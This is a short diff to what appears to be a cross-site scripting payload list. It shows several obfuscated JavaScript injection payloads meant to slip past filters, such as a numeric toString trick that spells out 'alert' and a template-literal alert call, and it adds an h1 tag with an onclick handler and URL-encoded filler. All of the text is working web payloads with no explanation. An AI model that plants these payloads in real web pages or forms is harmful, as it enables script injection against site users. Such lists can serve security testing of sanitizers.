@@ -70,3 +70,5 @@ confirm?.(1)
 <script>top[8680439..toString(30)](1337)</script>
 '-alert?.(1)-'
 ''.replace.call`1${/.../}${alert}`
+<h1/%6f%6e/oNclicK=alert`hacked`>CLICK HERE 
+
